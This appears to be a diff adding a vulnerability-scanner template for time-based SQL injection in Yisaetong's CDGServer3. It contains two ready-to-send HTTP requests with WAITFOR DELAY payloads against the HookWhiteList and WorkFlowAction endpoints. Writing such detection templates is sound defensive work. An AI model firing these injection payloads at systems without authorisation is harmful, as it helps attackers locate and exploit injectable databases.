@@ -1,0 +1,47 @@
+id: yisaetong-sql-injection
+
+info:
+  name: Yisaetong SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects SQL injection vulnerability in Yisaetong's HookWhiteListservice.
+    Exploits delay-based time SQL injection by observing server response times.
+  tags: sql-injection, time-based, yisaetong
+
+http:
+  - raw:
+      - |
+        GET /CDGServer3/policy/HookWhiteList;logindojojs?command=AddHookWhiteList&policyId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration > 5000
+
+  - raw:
+      - |
+        POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: zh-CN,zh;q=0.9
+
+        command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=111'%3bWAITFOR+DELAY+'0%3a0%3a4'-
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration > 4000
